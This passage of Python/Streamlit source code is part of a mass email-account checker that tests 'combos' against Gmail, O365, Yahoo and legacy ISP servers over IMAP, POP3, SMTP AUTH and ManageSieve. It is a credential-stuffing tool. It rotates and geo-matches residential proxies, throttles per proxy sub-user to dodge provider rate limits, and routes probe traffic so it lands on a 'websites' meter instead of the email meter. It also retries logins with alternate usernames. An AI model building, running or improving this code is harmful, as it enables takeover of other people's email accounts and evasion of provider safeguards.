            _STARTUP_SEEN.add(msg)
    except Exception:
        with _STARTUP_BUFFER_LOCK:
            _STARTUP_BUFFER.append(entry)


def startup_panel_lines():
    try:
        main = list(str_lit.session_state.startup_entries)
    except Exception:
        main = []
    with _STARTUP_BUFFER_LOCK:
        buffered = list(_STARTUP_BUFFER)
    if not buffered:
        return main
    return main + ["", "-- background thread (quiet mode) --"] + buffered
# @@END 038 STARTUP_LOG

# @@BLOCK 039 STATE_ALIASES deps=024,038
cache_lock = STATE["cache_lock"]
proxy_lock = STATE["proxy_lock"]
file_write_lock = STATE["file_write_lock"]
session_state_lock = STATE["session_state_lock"]
alive_pool = STATE["alive_pool"]
alive_pool_lock = STATE["alive_pool_lock"]
consecutive_proxy_failures = STATE["consecutive_proxy_failures"]
circuit_breaker_until = STATE["circuit_breaker_until"]
failed_domain_cache = STATE["failed_domain_cache"]
_host_dns_cache = STATE["host_dns_cache"]
_host_dns_lock = STATE["host_dns_lock"]

proxy_quarantine = STATE["proxy_quarantine"]
proxy_quarantine_lock = STATE["proxy_quarantine_lock"]
_proxy_407 = STATE["strikes_407"]
_proxy_scheme = STATE["proxy_scheme"]
_proxy_scheme_lock = STATE["proxy_scheme_lock"]

_rr_lock = STATE["rr_lock"]

_GEO_CACHE = STATE["geo_cache"]
_GEO_LOCK = STATE["geo_lock"]
_GEO_FAIL = STATE.setdefault("geo_fail", {})
_geo_last_call = STATE.setdefault("geo_last_call", {"ts": 0.0})

_PUBLIC_IP = STATE["public_ip"]
_PUBLIC_IP_LOCK = STATE["public_ip_lock"]
_DIRECT_GEO = STATE["direct_geo"]
_DIRECT_GEO_LOCK = STATE["direct_geo_lock"]
_DIRECT_ISP = STATE["direct_isp"]

_SMTP_DOMAIN_CACHE = STATE["smtp_domain_cache"]
_SMTP_LOCK = STATE["smtp_lock"]
_SMTP_CACHE_TTL = 900
_SMTP_PRECHECK_BUDGET = 45.0
_SMTP_PRECHECK_WORKERS = 32

STATE.setdefault("proxy_407_until", {})

log_startup("Application process started. Initializing session state and loading configurations...")
log_startup(f"hosts.py status -> loaded={HOSTS_OK} has_ranking={HOSTS_HAS_RANKING} "
            f"merge={_HAVE_HOSTS_MERGE} {HOSTS_IMPORT_NOTE}".strip())
log_startup(f"status.py status -> {STATUS_IMPORT_NOTE}")
log_startup(f"ms_oauth.py status -> loaded={MS_OAUTH_OK} "
            f"(Microsoft XOAUTH2 {'active' if MS_OAUTH_OK else 'INACTIVE'})")
# @@END 039 STATE_ALIASES

# @@BLOCK 040 GATES deps=039
class _NullGate:
    def acquire(self, timeout=None):
        return True

    def release(self):
        pass


_null_gate = _NullGate()


def _proxy_gate():
    """Global cap on simultaneous proxy tunnels (persistent across reruns)."""
    g = STATE.get("proxy_gate")
    if g is None:
        try:
            limit = int(CFG.get("PROXY_CONCURRENCY", PROXY_CONCURRENCY_DEFAULT)) \
                or PROXY_CONCURRENCY_DEFAULT
        except Exception:
            limit = PROXY_CONCURRENCY_DEFAULT
        g = threading.BoundedSemaphore(max(1, limit))
        STATE["proxy_gate"] = g
    return g


def _host_gate(host):
    """Per-destination-HOSTNAME cap so 50 workers do not slam one IMAP box."""
    if not host:
        return _null_gate
    with STATE["host_gate_lock"]:
        gates = STATE["host_gates"]
        g = gates.get(host)
        if g is None:
            try:
                limit = int(CFG.get("HOST_CONCURRENCY", HOST_CONCURRENCY_DEFAULT)) \
                    or HOST_CONCURRENCY_DEFAULT
            except Exception:
                limit = HOST_CONCURRENCY_DEFAULT
            g = threading.BoundedSemaphore(max(1, limit))
            gates[host] = g
        return g


def _ip_gate(ip):
    """Per-PROXY-IP cap.  The PROBER takes it too."""
    if not ip:
        return _null_gate
    with STATE["host_gate_lock"]:
        gates = STATE["ip_gates"]
        g = gates.get(ip)
        if g is None:
            try:
                limit = int(CFG.get("PROXY_IP_CONCURRENCY", PROXY_IP_CONCURRENCY_DEFAULT)) \
                    or PROXY_IP_CONCURRENCY_DEFAULT
            except Exception:
                limit = PROXY_IP_CONCURRENCY_DEFAULT
            g = threading.BoundedSemaphore(max(1, limit))
            gates[ip] = g
        return g


def _subuser_of(proxy_str) -> str:
    """The SUB-USER half of a proxy line - what the provider meters."""
    try:
        info = parse_proxy(proxy_str)
        return (info.get("user") or "").strip().lower() if info else ""
    except Exception:
        return ""


def _subuser_gate(subuser):
    """Per-PROXY-SUBUSER cap - the single most important 407 control."""
    if not subuser:
        return _null_gate
    with STATE["host_gate_lock"]:
        gates = STATE["subuser_gates"]
        g = gates.get(subuser)
        if g is None:
            try:
                limit = int(CFG.get("PROXY_SUBUSER_CONCURRENCY",
                                    PROXY_SUBUSER_CONCURRENCY_DEFAULT)) \
                    or PROXY_SUBUSER_CONCURRENCY_DEFAULT
            except Exception:
                limit = PROXY_SUBUSER_CONCURRENCY_DEFAULT
            g = threading.BoundedSemaphore(max(1, limit))
            gates[subuser] = g
        return g


def _reset_gates():
    """Rebuild every gate (called when settings are applied)."""
    with STATE["host_gate_lock"]:
        STATE["host_gates"] = {}
        STATE["ip_gates"] = {}
        STATE["subuser_gates"] = {}
    STATE["proxy_gate"] = None
    log_probe_event("concurrency gates rebuilt")
# @@END 040 GATES

# @@BLOCK 041 PROXY_407_PARK deps=016,039,040
def _proxy_407_parked(proxy_str) -> bool:
    if not proxy_str:
        return False
    until = (STATE.get("proxy_407_until") or {}).get(proxy_str, 0.0)
    return until > time.time()


def _park_proxy_407(proxy_str):
    """Park a 407'd node briefly instead of killing it for the run."""
    if not proxy_str:
        return
    try:
        STATE.setdefault("proxy_407_until", {})[proxy_str] = time.time() + PROXY_407_COOLDOWN
    except Exception:
        pass


def _gated_tunnel(proxy_str, timeout=None, targets=None):
    """Run tunnel_probe() behind the proxy gate, the per-IP gate and the
    per-SUB-USER gate."""
    info = parse_proxy(proxy_str)
    base_wait = max(3.0, float(timeout if timeout is not None else probe_timeout()) + 2.0)
    wait = _gate_wait(base_wait)
    got_proxy = got_ip = got_sub = False
    pg = _proxy_gate()
    ig = _ip_gate(info["host"] if info else None)
    sg = _subuser_gate((info.get("user") or "").lower() if info else "")
    try:
        try:
            got_proxy = pg.acquire(timeout=wait)
        except Exception:
            got_proxy = False
        try:
            got_ip = ig.acquire(timeout=wait)
        except Exception:
            got_ip = False
        try:
            got_sub = sg.acquire(timeout=wait)
        except Exception:
            got_sub = False
        return tunnel_probe(proxy_str, targets=targets, timeout=timeout)
    finally:
        if got_sub:
            try:
                sg.release()
            except Exception:
                pass
        if got_ip:
            try:
                ig.release()
            except Exception:
                pass
        if got_proxy:
            try:
                pg.release()
            except Exception:
                pass
# @@END 041 PROXY_407_PARK

# @@BLOCK 042 CHECKER_CONFIG deps=009
@dataclass
class CheckerConfig:
    mode_name: str = "Normal"
    fast_mode: bool = False
    max_concurrent_checks: int = 50
    connect_timeout: float = 8.0
    max_retries: int = 2
    failure_cooldown: float = FAILURE_COOLDOWN_DEFAULT
# @@END 042 CHECKER_CONFIG

# @@BLOCK 043 SECRETS_BRIDGE deps=038
def _secret_to_env(k, v):
    if v is None:
        return
    if isinstance(v, (list, tuple)):
        os.environ[str(k)] = "\n".join(str(x) for x in v if x is not None)
        return
    if isinstance(v, dict):
        # FIX SEC-1: nested [sections] in secrets.toml used to be dropped entirely.
        for _sk, _sv in v.items():
            _secret_to_env(_sk, _sv)
        return
    os.environ[str(k)] = str(v)


try:
    for k, v in str_lit.secrets.items():
        _secret_to_env(k, v)
    log_startup("Successfully bridged Streamlit secrets to environment variables.")
except Exception as e:
    log_startup(f"WARNING: Failed to bridge secrets to environment: {e}")

WEBSHARE_KEYS = [line.strip() for line in os.getenv("WEBSHARE_KEYS", "").splitlines()
                 if line.strip()]
OXYLABS_PROXIES = [line.strip() for line in
                   (os.getenv("OXYLABS_BASE") or os.getenv("OXYLABS_PROXIES") or "").splitlines()
                   if line.strip()]
log_startup(f"Secrets keys: webshare={len(WEBSHARE_KEYS)} oxylabs={len(OXYLABS_PROXIES)}")
# @@END 043 SECRETS_BRIDGE

# @@BLOCK 044 HELP_WIDGET deps=043
if "help_states" not in str_lit.session_state:
    str_lit.session_state.help_states = {}


def instant_help(key_name, description_text, label_text, widget_type="label", **kwargs):
    try:
        if key_name not in str_lit.session_state.help_states:
            str_lit.session_state.help_states[key_name] = {"visible": False, "time": 0}

        state_data = str_lit.session_state.help_states[key_name]
        if state_data.get("visible", False) and time.time() - state_data.get("time", 0) > 10.0:
            str_lit.session_state.help_states[key_name]["visible"] = False

        col_lbl, col_btn = str_lit.sidebar.columns([0.85, 0.15])
        val = None
        with col_lbl:
            if widget_type == "label":
                str_lit.markdown(f"**{label_text}**")
            elif widget_type == "checkbox":
                try:
                    val = str_lit.checkbox(label_text, value=kwargs.get("value", False),
                                           key=f"chk_{key_name}")
                except Exception as widget_err:
                    str_lit.error(f"Widget payload/input error: {widget_err}")
                    val = kwargs.get("value", False)
            elif widget_type in ("text", "selectbox"):
                str_lit.markdown(f"**{label_text}**")

        with col_btn:
            if str_lit.button("❓", key=f"help_btn_{key_name}", help="Toggle help description"):
                try:
                    current = str_lit.session_state.help_states[key_name]["visible"]
                    str_lit.session_state.help_states[key_name] = {
                        "visible": not current, "time": time.time()}
                except Exception as btn_err:
                    warnings.warn(f"State transition error in help button: {btn_err}")

        if str_lit.session_state.help_states[key_name]["visible"]:
            str_lit.sidebar.markdown(
                f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)

        if widget_type == "checkbox":
            return val
    except Exception as e:
        warnings.warn(f"Error rendering instant help widget {key_name}: {e}")
    return None
# @@END 044 HELP_WIDGET

# @@BLOCK 045 SETTINGS_RESET deps=019,020,024,040,043
def _apply_settings_reset(reason: str = "Reset Defaults"):
    """Restore EVERY settings widget to its default and stamp applied_cfg from
    the pure-constant default_cfg()."""
    for k, v in SETTING_DEFAULTS.items():
        try:
            str_lit.session_state[k] = list(v) if isinstance(v, list) else v
        except Exception:
            pass
    # v13.45: ui_font_size / ui_content_scale are created by auth.fit() in block
    # 007, which has ALREADY run by the time this executes - so assigning them in
    # the loop above raises StreamlitWidgetAlreadyInstantiatedError and is
    # swallowed. They were therefore the only two settings Reset Defaults could
    # never restore. Hand the pair to auth.fit() through its own one-shot flag;
    # fit() consumes it at the top of the next run, where assigning is legal.
    try:
        str_lit.session_state["_fit_reset"] = True
    except Exception:
        pass
    try:
        str_lit.session_state.pool_mode = "all"
        str_lit.session_state.pool_locked = True
        str_lit.session_state.pool_pick = None
        str_lit.session_state.picked_countries = []
    except Exception:
        pass
    try:
        str_lit.session_state.applied_cfg = default_cfg()
        str_lit.session_state.applied_cfg_version = CFG_VERSION
    except Exception:
        pass
    try:
        str_lit.session_state["_bb_prefilter_cache"] = None
    except Exception:
        pass
    _reset_gates()
    log_startup(f"All settings reset to UNIVERSAL DEFAULTS by {reason}.")
    log_probe_event(f"settings reset to universal defaults ({reason})")


_reset_all_settings = _apply_settings_reset

if str_lit.session_state.pop("_bb_reset_pending", False):
    _apply_settings_reset("Reset Defaults button")
    # The flag above is consumed by auth.fit() at block 007, which has already
    # run. Rerun once so the widgets are rebuilt from the new values - both the
    # ones assigned here and the Display Fit pair.
    str_lit.rerun()
# @@END 045 SETTINGS_RESET

# @@BLOCK 046 SIDEBAR_MODE deps=009,042,043,044
str_lit.sidebar.header("⚙ Engine Control Panel")
str_lit.sidebar.caption(
    "Universal defaults are pre-set for ANY mix of combos (Gmail / O365 / Yahoo / "
    "legacy ISP). The engine dials IMAP + POP3 by default, so a legacy IMAP front "
    "that sends '* BYE' has a second, independent protocol to fall back to."
)
str_lit.sidebar.caption(
    "ℹ️ Seeing **`TypeError: Importing a module script failed.`** in red? That is the "
    "BROWSER holding a stale JavaScript chunk after a redeploy - hard-refresh the tab "
    "(Ctrl/Cmd+Shift+R). It is not an app error."
)

# Display Fit is NOT defined here. auth.fit() (block 007) already owns
# ui_font_size / ui_content_scale and renders them in the 🔎 Display Fit expander.
# A second pair with the same keys is an instant StreamlitDuplicateElementKey -
# and its 80-140 percent range fought fit_css()'s factor clamp.
str_lit.sidebar.subheader("🔎 Display Fit")
str_lit.sidebar.caption("The sliders live in the Display Fit box at the top of the page.")

str_lit.sidebar.markdown("---")

checker_mode = str_lit.sidebar.selectbox(
    "⚡ Select Engine Mode:",
    options=["Normal Mode", "Fast Mode", "Deep / Aggressive Mode"],
    index=0,
    key="ui_mode",
    help="Normal: balanced and safe for legacy ISP IMAP. Fast: syntax + MX pre-filter, "
         "rapid ports. Deep: maximum depth, multiple fallbacks, strict validation."
)
# v13.42: ui_workers / ui_deadline / ui_timeout are the SAME widget keys in all
# three branches, but each branch declares DIFFERENT ranges, so a mode switch
# could leave a stored value outside the new slider's range.  Clamp to the mode
# we are about to render - legal here, the widgets do not exist yet this run.
_bounds = {"Fast Mode": ((1, 100), (10, 300), (3, 40)),
           "Deep / Aggressive Mode": ((1, 50), (15, 400), (5, 60))}.get(
    checker_mode, ((1, 100), (10, 300), (3, 40)))
for _k, (_lo, _hi) in zip(("ui_workers", "ui_deadline", "ui_timeout"), _bounds):
    _v = str_lit.session_state.get(_k)
    if isinstance(_v, int) and not (_lo <= _v <= _hi):
        str_lit.session_state[_k] = max(_lo, min(_hi, _v))
if checker_mode == "Fast Mode":
    engine_config = CheckerConfig(mode_name="Fast", fast_mode=True, max_concurrent_checks=100,
                                  connect_timeout=5.0, max_retries=1, failure_cooldown=60.0)
    workers = str_lit.sidebar.slider("Workers Start", 1, 100, WORKERS_FAST, 1, key="ui_workers")
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 10, 300, int(DEADLINE_FAST), 5,
                                      key="ui_deadline")
    timeout = str_lit.sidebar.slider("Timeout", 3, 40, ATTEMPT_TIMEOUT_FAST, 1, key="ui_timeout")
    default_hosts = 2
elif checker_mode == "Deep / Aggressive Mode":
    engine_config = CheckerConfig(mode_name="Deep", fast_mode=False, max_concurrent_checks=30,
                                  connect_timeout=12.0, max_retries=4, failure_cooldown=20.0)
    workers = str_lit.sidebar.slider("Workers Start", 1, 50, WORKERS_DEEP, 1, key="ui_workers")
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 15, 400, int(DEADLINE_DEEP), 5,
                                      key="ui_deadline")
    timeout = str_lit.sidebar.slider("Timeout", 5, 60, ATTEMPT_TIMEOUT_DEEP, 1, key="ui_timeout")
    default_hosts = 4
else:
    engine_config = CheckerConfig(mode_name="Normal", fast_mode=False, max_concurrent_checks=50,
                                  connect_timeout=8.0, max_retries=2,
                                  failure_cooldown=FAILURE_COOLDOWN_DEFAULT)
    workers = str_lit.sidebar.slider("Workers Start", 1, 100, WORKERS_NORMAL, 1, key="ui_workers")
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 10, 300, int(DEADLINE_NORMAL), 5,
                                      key="ui_deadline")
    timeout = str_lit.sidebar.slider("Timeout", 3, 40, ATTEMPT_TIMEOUT_NORMAL, 1, key="ui_timeout")
    default_hosts = 3
max_acc = str_lit.sidebar.slider("Max Accounts", 0, 5000, 5000, 100, key="ui_max_acc")
blacklist_cf = str_lit.sidebar.slider(
    "Blacklist CF (consecutive proxy fails)", 3, 100, BLACKLIST_CF_DEFAULT, 1,
    key="ui_blacklist_cf",
    help="A proxy is circuit-broken for 30s after this many consecutive network failures."
)
# @@END 046 SIDEBAR_MODE

# @@BLOCK 047 SIDEBAR_PROTOCOLS deps=011,046
protocol_pick = str_lit.sidebar.multiselect(
    "🧩 Pick Protocols Mode",
    options=PROTOCOL_OPTIONS,
    default=PROTOCOL_SELECTION_DEFAULT,
    key="ui_protocols",
    help="Which protocols the engine is allowed to DIAL. DEFAULT IS IMAP + POP3 - POP3 is "
         "the only independent path when a legacy IMAP front answers LOGIN with '* BYE' "
         "and hangs up.\n\n"
         "IMAP - 993 (TLS) / 143 (STARTTLS / plain). The default and the one that matters "
         "most.\n"
         "POP3 - 995 (TLS) / 110 (STLS / plain). A completely separate code path: "
         "different port, different daemon, different IP-reputation bucket.\n"
         "SMTP - submission AUTH on 587 -> 465 -> 25. CONFIRM-ONLY.\n"
         "ManageSieve - 4190. CONFIRM-ONLY, same credentials, sometimes open when IMAP is not."
)
if not protocol_pick:
    str_lit.sidebar.caption("⚠ Nothing ticked - falling back to IMAP.")
else:
    str_lit.sidebar.caption(
        "Dialling: **" + " + ".join(protocol_pick) + "**"
        + ("  ·  SMTP/ManageSieve are confirm-only"
           if any(p in ("SMTP", "ManageSieve") for p in protocol_pick) else ""))
# @@END 047 SIDEBAR_PROTOCOLS

# @@BLOCK 048 SIDEBAR_RULES deps=046
str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🎛 Advanced Control Rules")
dynamic_worker_scaling = str_lit.sidebar.toggle(
    "⚡ Thread Auto-Scaling / Dynamic Workers", value=True, key="ui_dynamic_scaling",
    help="Let the engine scale worker threads with live network conditions.")
max_hosts_per_domain = str_lit.sidebar.slider(
    "Max Hosts Per Domain", 1, 8, default_hosts, 1, key="ui_max_hosts",
    help="How many discovered IMAP hosts to try per account. STARTTLS / plain and POP "
         "rungs are capped separately."
)
try_alt_username_ui = str_lit.sidebar.toggle(
    "Try local-part username on auth failure", value=True, key="ui_alt_user",
    help="Many legacy ISP servers (Zimbra / cPanel / Dovecot) expect 'user' rather than "
         "'user@domain'. On an auth rejection the engine holds the node and retries the "
         "SAME host with the local part. This also fires on a LOGIN_DROPPED (* BYE), not "
         "just WRONG. Not applied to SMTP."
)
confirm_wrong_ui = str_lit.sidebar.toggle(
    "✅ Confirm a WRONG verdict across hosts before accepting it", value=True,
    key="ui_confirm_wrong",
    help="GUARD. ON (default): a single AUTHENTICATIONFAILED is PROVISIONAL - the ladder "
         "keeps going (POP3, the sibling hosts, 143/110, then DIRECT) until a SECOND host "
         "agrees or nothing is left to dial. A single host is NOT authoritative: "
         "imap.<domain> is often a different box from the mailbox's real host, and it "
         "answers AUTHENTICATIONFAILED for accounts it has never heard of. OFF: restore "
         "the one-rung behaviour (faster on huge lists, more false wrong_password)."
)

smtp_precheck_ui = str_lit.sidebar.checkbox(
    "📮 Enable SMTP pre-check  (OFF by default)",
    value=False, key="ui_smtp_precheck",
    help="A REACHABILITY banner probe only (220 on 587/465/25) - it never authenticates. "
         "Separate from the SMTP protocol rung in Pick Protocols Mode, which does AUTH PLAIN."
)

custom_whitelist_input = str_lit.sidebar.text_input(
    "Custom Whitelist Domains (comma-separated)", placeholder="gmail.com, outlook.com")
custom_blacklist_input = str_lit.sidebar.text_input(
    "Custom Blacklist Domains (comma-separated)", placeholder="spamdomain.com")
# @@END 048 SIDEBAR_RULES

# @@BLOCK 049 SIDEBAR_POOL deps=016,017,018,046
str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🌐 Proxy / Pool Configuration")
min_proxy_score = str_lit.sidebar.slider(
    "Min Proxy Score", 0, 100, MIN_PROXY_SCORE_DEFAULT, 10, key="ui_min_proxy_score",
    help="A node is dropped from the pool once its score falls below this."
)
proxy_precheck_timeout = str_lit.sidebar.slider(
    "Proxy Pre-Check Timeout (Sec)", 1, 10, PROXY_PRECHECK_TIMEOUT_DEFAULT, 1,
    key="ui_probe_precheck_timeout"
)
probe_timeout_ui = str_lit.sidebar.slider(
    "Tunnel Probe Timeout (Sec)", 3, 20, int(PROBE_TIMEOUT_DEFAULT), 1, key="ui_probe_timeout",
    help="How long a node gets IN TOTAL to open a real CONNECT tunnel to any probe target."
)
probe_target_ui = str_lit.sidebar.selectbox(
    "Tunnel Probe Target",
    PROBE_TARGET_OPTIONS,
    index=_safe_index(PROBE_TARGET_OPTIONS, PROBE_TARGET_DEFAULT),
    key="ui_probe_target",
    help="DEFAULT '443 (HTTPS)': the probe dials api.ipify.org:443, which is NOT a mail "
         "server, so ALL probe traffic lands on your provider's WEBSITES meter instead of "
         "the EMAIL-SERVERS meter."
)
probe_strict_ui = str_lit.sidebar.toggle(
    "Strict tunnel probe", value=True, key="ui_probe_strict",
    help="ON (default): only nodes that pass the probe enter the live pool, so 'Alive: 0' "
         "means what it says."
)
probe_max_targets_ui = str_lit.sidebar.slider(
    "Probe: max targets per node", 1, 3, PROBE_MAX_TARGETS_DEFAULT, 1, key="ui_probe_maxtargets",
    help="1 (default) = AUTO resolves the SINGLE dominant mail host in your queue."
)
probe_second_scheme_ui = str_lit.sidebar.toggle(
    "Probe: also try the second proxy scheme", value=PROBE_SECOND_SCHEME_DEFAULT,
    key="ui_probe_scheme2",
    help="OFF (default) = one CONNECT per probe when the first scheme PASSES. The alternate "
         "scheme is ALWAYS tried after a FAILURE regardless of this switch."
)
prober_idle_ui = str_lit.sidebar.toggle(
    "Probe: keep probing in the background while idle",
    value=PROBER_IDLE_ENABLED_DEFAULT, key="ui_prober_idle",
    help="OFF (default) = the pool is probed once when the page loads, then only when you "
         "click Start or Re-probe."
)
mail_spot_ui = str_lit.sidebar.toggle(
    "✉️ Spot-check the pool against a MAIL destination", value=MAIL_SPOT_CHECK_DEFAULT,
    key="ui_mail_spot",
    help="After every probe cycle, CONNECT 3 random nodes to your first queued mail host "
         "(fallback imap.gmail.com:993) and report it. Without this a provider "
         "'email servers' cap looks exactly like a perfectly healthy pool right up until "
         "the run 407s on every account."
)
probe_sample_ui = str_lit.sidebar.slider(
    "Probe: max nodes per cycle (0 = all)", 0, 200, 0, 5, key="ui_probe_sample",
    help="Randomly sample this many nodes per cycle instead of probing the whole file. "
         "Cheapest is 20."
)
dedupe_proxies_ui = str_lit.sidebar.toggle(
    "Deduplicate proxy pool", value=True, key="ui_dedupe",
    help="ON (default): collapse repeated host:port lines in proxies.txt."
)
allow_blacklist_ips = str_lit.sidebar.toggle(
    "Allow Blacklisted / Flagged Proxy IPs", value=False, key="ui_allow_blacklist",
    help="When disabled (default), circuit-broken proxies are excluded from BOTH the pool "
         "AND the live ladder."
)
proxy_quarantine_ui = str_lit.sidebar.toggle(
    "🩹 Quarantine nodes that return 407", value=True, key="ui_quarantine",
    help="ON (default): a node that answers '407 Proxy Authentication Required' THREE "
         "times is pulled out of the pool for the rest of the run. A plain socket reset "
         "is NOT a 407."
)
# @@END 049 SIDEBAR_POOL

# @@BLOCK 050 SIDEBAR_CONCURRENCY deps=012,017,046
str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🚦 Concurrency Governors")
host_concurrency_ui = str_lit.sidebar.slider(
    "Per-Host Connection Cap", 1, 12, HOST_CONCURRENCY_DEFAULT, 1, key="ui_host_conc",
    help="Max simultaneous connections to ONE mail hostname. 2 is right for legacy ISP IMAP."
)
proxy_ip_concurrency_ui = str_lit.sidebar.slider(
    "Per-Proxy-IP Connection Cap", 1, 12, PROXY_IP_CONCURRENCY_DEFAULT, 1, key="ui_ip_conc",
    help="Default 1. Max simultaneous tunnels through ONE proxy IP, for the CHECKER and "
         "the PROBER alike."
)
proxy_subuser_concurrency_ui = str_lit.sidebar.slider(
    "Per-Proxy-SUBUSER Connection Cap", 1, 12, PROXY_SUBUSER_CONCURRENCY_DEFAULT, 1,
    key="ui_subuser_conc",
    help="Default 1. Providers rate-limit PER SUB-USER - a 407 is what you get when that "
         "cap is exceeded, NOT because the node is dead. The single most important 407 "
         "control in the app."
)
proxy_concurrency_ui = str_lit.sidebar.slider(
    "Global Proxy Connection Cap", 2, 60, PROXY_CONCURRENCY_DEFAULT, 1, key="ui_proxy_conc",
    help="Max simultaneous proxy tunnels across the whole run (the prober shares this)."
)
direct_first_ui = str_lit.sidebar.toggle(
    "⚡ Direct-First (try the direct egress before the proxy)", value=False,
    key="ui_direct_first",
    help="ON: run the DIRECT sweep first and only fall back to the proxy. Also auto-engages "
         "per account when >50% of the pool is quarantined."
)
same_host_retries_ui = str_lit.sidebar.slider(
    "Same-Host Retries on a SLOW answer", 0, 4, SAME_HOST_RETRIES_DEFAULT, 1,
    key="ui_same_host_retries",
    help="Only applies to READ-level slowness."
)
max_rotations_ui = str_lit.sidebar.slider(
    "Max proxy rotations per rung", 0, 8, MAX_ROTATIONS_DEFAULT, 1, key="ui_max_rot",
    help="Every rotation is another proxy request. 5 -> 2 is roughly a 60% cut in the "
         "worst case."
)
pass2_ui = str_lit.sidebar.toggle(
    "Second pass over network-failed hosts", value=CHECK_PASS2_DEFAULT, key="ui_pass2",
    help="OFF (default) = one pass over the ladder. ON = re-dial every host that failed "
         "with a NETWORK error."
)
# @@END 050 SIDEBAR_CONCURRENCY

# @@BLOCK 051 SIDEBAR_ROUTING deps=046
str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🔀 Proxy Routing Intelligence")
proxy_random_rotation = str_lit.sidebar.toggle(
    "🔀 Proxy Random Rotation", value=True, key="ui_random_rot",
    help="ON (default): a DIFFERENT random node is used for every attempt, with a "
         "per-account avoid-set."
)
geo_call_proxy = str_lit.sidebar.toggle(
    "🌍 Geo-Call Proxy", value=False, key="ui_geo_call",
    help="Prefer a node whose geo matches the email's country/region. Falls back to the "
         "general pool on failure."
)
my_connection = str_lit.sidebar.selectbox(
    "📶 My own connection (stamped on direct fallbacks)", ["Auto", "VPN ON", "VPN OFF"],
    index=0, key="ui_conn_hint", help="Diagnostic only."
)
# @@END 051 SIDEBAR_ROUTING

# @@BLOCK 052 CACHE_PROXY_PARSE_PICKER deps=024,039,051
if "pool_mode" not in str_lit.session_state:
    str_lit.session_state.pool_mode = "all"
if "pool_locked" not in str_lit.session_state:
    str_lit.session_state.pool_locked = True
if "picked_countries" not in str_lit.session_state:
    str_lit.session_state.picked_countries = []


def load_json(path, default=None):
    if default is None:
        default = {}
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)
                log_startup(f"Successfully loaded JSON cache from {path}.")
                return data
        except Exception as e:
            log_startup(f"WARNING: Failed to load JSON file {path}: {e}")
            return default
    log_startup(f"JSON cache file {path} not found. Using default.")
    return default


domain_cache = load_json("domain_cache.json", {})
proxy_meta = STATE["meta"]


def load_proxies(quiet: bool = False):
    """Proxies come from proxies.txt only."""
    if not os.path.exists("proxies.txt"):
        try:
            with file_write_lock:
                with open("proxies.txt", "w", encoding="utf-8") as f:
                    if OXYLABS_PROXIES:
                        f.write("\n".join(OXYLABS_PROXIES) + "\n")
            log_startup(f"Created proxies.txt (seeded from secrets: "
                        f"{len(OXYLABS_PROXIES)}).", quiet=quiet)
        except Exception as e:
            log_startup(f"WARNING: Failed to initialize proxies.txt: {e}", quiet=quiet)
    try:
        with open("proxies.txt", encoding="utf-8", errors="ignore") as f:
            raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        try:
            dedupe = bool(CFG.get("DEDUPE_PROXIES", DEDUPE_PROXIES_DEFAULT))
        except Exception:
            dedupe = DEDUPE_PROXIES_DEFAULT
        if dedupe:
            uniq = list(dict.fromkeys(raw_list))
            if len(uniq) != len(raw_list):
                log_startup(f"Loaded {len(raw_list)} proxies from proxies.txt "
                            f"({len(uniq)} unique after dedupe).", quiet=quiet)
            raw_list = uniq
        else:
            log_startup(f"Loaded {len(raw_list)} proxies from proxies.txt.", quiet=quiet)
        return raw_list
    except Exception as e:
        log_startup(f"WARNING: Failed to read proxies.txt: {e}", quiet=quiet)
        return []


def compute_real_score(success_count, fail_count, initial_latency_score=80):
    try:
        if (success_count + fail_count) == 0:
            return initial_latency_score
        sr = ((success_count + 2) / (success_count + fail_count + 3)) * 100
        return max(0, min(100, int(sr - (fail_count * 5))))
    except Exception:
        return initial_latency_score


def is_proxy_alive(proxy_host, proxy_port, timeout=2):
    try:
        with socket.create_connection((proxy_host, int(proxy_port)), timeout=timeout):
            return True
    except Exception:
        return False


def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    try:
        p = proxy_str.strip()
        if "://" in p:
            u = urlparse(p)
            return {"host": u.hostname, "port": u.port or 80,
                    "user": u.username, "pass": u.password}
        if "@" in p:
            cred, hostpart = p.rsplit("@", 1)
            user, pwd = cred.split(":", 1)
            host, port = hostpart.split(":", 1)
            return {"host": host, "port": int(port), "user": user, "pass": pwd}
        parts = p.split(":")
        if len(parts) == 4:
            return {"host": parts[0], "port": int(parts[1]),
                    "user": parts[2], "pass": parts[3]}
        if len(parts) == 2:
            return {"host": parts[0], "port": int(parts[1]), "user": None, "pass": None}
    except Exception:
        pass
    return None


def proxy_is_quarantined(proxy_str) -> bool:
    if not proxy_str:
        return False
    with proxy_quarantine_lock:
        return proxy_str in proxy_quarantine


def quarantine_proxy(proxy_str, reason=""):
    if not proxy_str:
        return False
    with proxy_quarantine_lock:
        if proxy_str in proxy_quarantine:
            return False
        proxy_quarantine.add(proxy_str)
        size = len(proxy_quarantine)
    with alive_pool_lock:
        total = len(alive_pool)
    log_startup(f"Proxy quarantined ({reason or '407'}): {proxy_str} "
                f"[{size} quarantined / {total} alive]", quiet=True)
    log_probe_event(f"QUARANTINE {proxy_str} ({reason or '407'}) [{size}/{total}]")
    return True


def quarantine_size() -> int:
    with proxy_quarantine_lock:
        return len(proxy_quarantine)


def clear_proxy_quarantine():
    with proxy_quarantine_lock:
        proxy_quarantine.clear()
    _proxy_407.clear()
    try:
        STATE.setdefault("proxy_407_until", {}).clear()
    except Exception:
        pass
    log_probe_event("quarantine cleared by user")


def _scheme_order(proxy_str):
    """Try the scheme that last worked for this node FIRST. HTTP is the default."""
    with _proxy_scheme_lock:
        pref = _proxy_scheme.get(proxy_str)
    if pref == socks.SOCKS5:
        return (socks.SOCKS5, socks.HTTP)
    return (socks.HTTP, socks.SOCKS5)


def _remember_scheme(proxy_str, ptype):
    with _proxy_scheme_lock:
        _proxy_scheme[proxy_str] = ptype


def geo_lookup(ip):
    """Country/region for an IP.

    The throttle RESERVES its slot under the lock and sleeps OUTSIDE it, and the
    reservation is PAID - the sleep equals the gap.  A capped sleep let the
    reservation grow without bound against ip-api's 45/min tier.
